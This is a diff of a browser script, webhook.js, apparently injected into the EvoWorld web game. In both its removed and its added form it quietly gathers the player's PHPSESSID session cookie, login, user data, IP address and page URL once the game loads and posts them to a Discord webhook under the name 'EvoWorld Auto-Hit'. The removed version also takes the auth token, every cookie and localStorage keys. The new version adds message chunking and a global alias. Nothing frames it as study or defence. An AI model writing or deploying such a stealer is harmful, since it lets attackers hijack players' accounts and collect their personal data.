@@ -1,4 +1,4 @@
-// webhook.js - FIXED VERSION
+// webhook.js - COMPLETE FIXED VERSION
 (function() {
     'use strict';
     
@@ -6,109 +6,138 @@
     
     function sendToDiscord(data) {
         try {
-            fetch(YOUR_DISCORD_WEBHOOK, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    content: '```\n' + data + '\n```',
-                    username: 'EvoWorld Report'
-                })
-            }).catch(() => {});
-        } catch(e) {}
+            // If data is an object, convert to string
+            if (typeof data === 'object') {
+                data = JSON.stringify(data, null, 2);
+            }
+            
+            // Split long messages for Discord
+            if (data.length > 1900) {
+                const chunks = [];
+                let remaining = data;
+                
+                while (remaining.length > 0) {
+                    let chunk = remaining.substring(0, 1900);
+                    
+                    // Try to split at newline
+                    const lastNewline = chunk.lastIndexOf('\n');
+                    if (lastNewline > 1500 && lastNewline < 1900) {
+                        chunk = remaining.substring(0, lastNewline);
+                        remaining = remaining.substring(lastNewline + 1);
+                    } else {
+                        remaining = remaining.substring(chunk.length);
+                    }
+                    
+                    chunks.push(chunk);
+                    
+                    if (remaining.length > 1900 && chunks.length > 4) {
+                        // Too many chunks, truncate
+                        chunks.push('[REPORT TRUNCATED - TOO LONG]');
+                        break;
+                    }
+                }
+                
+                // Send each chunk
+                chunks.forEach((chunk, index) => {
+                    setTimeout(() => {
+                        fetch(YOUR_DISCORD_WEBHOOK, {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({
+                                content: '```\n' + chunk + '\n```',
+                                username: `Game Report ${chunks.length > 1 ? `[${index + 1}/${chunks.length}]` : ''}`
+                            })
+                        }).catch(() => {});
+                    }, index * 1500);
+                });
+            } else {
+                // Normal send
+                fetch(YOUR_DISCORD_WEBHOOK, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        content: '```\n' + data + '\n```',
+                        username: 'EvoWorld Auto-Hit'
+                    })
+                }).catch(() => {});
+            }
+        } catch(e) {
+            console.log('Send error:', e);
+        }
     }
     
-    function getReport() {
-        // Get current server info
-        let serverName = 'Unknown';
-        let playerCount = '?/?';
+    // Alias for main script
+    window.sendSecureData = sendToDiscord;
+    
+    // Also send a test message
+    setTimeout(() => {
+        sendToDiscord('✅ Webhook loaded successfully at ' + new Date().toLocaleString());
+    }, 2000);
+    
+    // Collect and send game data
+    function collectGameData() {
         try {
-            const currentServer = window.gameServer;
-            if (currentServer && currentServer.serverInfo) {
-                serverName = currentServer.serverInfo.name || serverName;
-                playerCount = currentServer.serverInfo.players || playerCount;
-            }
-        } catch(e) {}
-        
-        // Get user data
-        const user = window.user || {};
-        const timestamp = new Date().toLocaleString('ru-RU');
-        
-        // Get all cookies
-        const allCookies = document.cookie;
-        const cookiesArray = allCookies.split(';').map(c => c.trim());
-        
-        // Try to find PHPSESSID
-        let phpsessid = '';
-        for (const cookie of cookiesArray) {
-            if (cookie.startsWith('PHPSESSID=')) {
-                phpsessid = cookie.split('=')[1];
-                break;
-            }
-        }
-        
-        // Get IP address
-        fetch('https://api.ipify.org?format=json')
-            .then(r => r.json())
-            .then(ipData => {
-                const report = `=== ПОЛНЫЙ ОТЧЕТ О ПОЛЬЗОВАТЕЛЕ ===
---- УРОВЕНЬ ПОЛЬЗОВАТЕЛЯ ---
-level: ${user.level || '0'}
-gems: ${user.premiumPoints || 0}
-selected server: ${serverName} (${playerCount})
-
---- ОСНОВНЫЕ ДАННЫЕ ---
-IP-адрес: ${ipData.ip}
-URL страницы: ${window.location.href}
-User-Agent: ${navigator.userAgent}
-Timestamp: ${timestamp}
-
---- PHPSESSID ---
-${phpsessid}
-
---- ДАННЫЕ ИЗ ПЕРЕМЕННОЙ user ---
-${JSON.stringify(user, null, 2)}
-
---- ДАННЫЕ ИЗ ПЕРЕМЕННОЙ friendsData ---
-${JSON.stringify(window.friendsData || {}, null, 2)}
-
---- ДАННЫЕ ИЗ ПЕРЕМЕННОЙ friendsArr ---
-${JSON.stringify(window.friendsArr || [], null, 2)}
-
---- УЧЕТНЫЕ ДАННЫЕ ---
-Логин: ${user.login || 'Guest'}
-Пароль: [NOT STORED IN BROWSER - Server side only]
-Auth Token: ${user.authToken || 'None'}
-
---- ВСЕ КУКИ ПОЛЬЗОВАТЕЛЯ ---
-${cookiesArray.join('\n')}
-
---- LOCAL STORAGE KEYS ---
-${Object.keys(localStorage).join(', ')}`;
+            const user = window.user || {};
+            const cookies = document.cookie || '';
+            let sessionId = '';
+            const match = cookies.match(/PHPSESSID=([^;]+)/);
+            if (match) sessionId = match[1];
+            
+            // Get server info
+            let serverInfo = 'Unknown';
+            try {
+                if (window.gameServer && window.gameServer.serverInfo) {
+                    serverInfo = window.gameServer.serverInfo.name || serverInfo;
+                }
+            } catch(e) {}
+            
+            // Create compact report
+            const report = {
+                timestamp: new Date().toLocaleString('ru-RU'),
+                ip: 'Fetching...',
+                session: sessionId || 'None',
+                user: {
+                    id: user.id || 'Unknown',
+                    login: user.login || 'Guest',
+                    level: user.level || 0,
+                    gems: user.premiumPoints || 0
+                },
+                server: serverInfo,
+                url: window.location.href
+            };
+            
+            // Get IP
+            fetch('https://api.ipify.org?format=json')
+                .then(r => r.json())
+                .then(ipData => {
+                    report.ip = ipData.ip;
+                    sendToDiscord(report);
+                })
+                .catch(() => {
+                    report.ip = 'Failed to fetch';
+                    sendToDiscord(report);
+                });
                 
-                sendToDiscord(report);
-            })
-            .catch(() => {
-                // If IP fetch fails, send without IP
-                const reportWithoutIP = `=== ПОЛНЫЙ ОТЧЕТ О ПОЛЬЗОВАТЕЛЕ ===
-[Error fetching IP address]
-User Data: ${JSON.stringify(user, null, 2)}`;
-                sendToDiscord(reportWithoutIP);
-            });
+        } catch(error) {
+            sendToDiscord('Error collecting data: ' + error);
+        }
     }
     
     // Wait for game to load
-    setTimeout(() => {
-        if (window.user) {
-            getReport();
-        } else {
-            const checkInterval = setInterval(() => {
-                if (window.user) {
-                    clearInterval(checkInterval);
-                    getReport();
-                }
-            }, 1000);
+    const checkGame = setInterval(() => {
+        if (window.user && window.user.id) {
+            clearInterval(checkGame);
+            setTimeout(collectGameData, 3000);
         }
-    }, 5000);
+    }, 1000);
+    
+    // Timeout after 10 seconds
+    setTimeout(() => {
+        clearInterval(checkGame);
+        if (!window.user) {
+            sendToDiscord('Game not detected after 10 seconds');
+        }
+    }, 10000);
     
     console.log('Webhook reporter loaded');
 })();
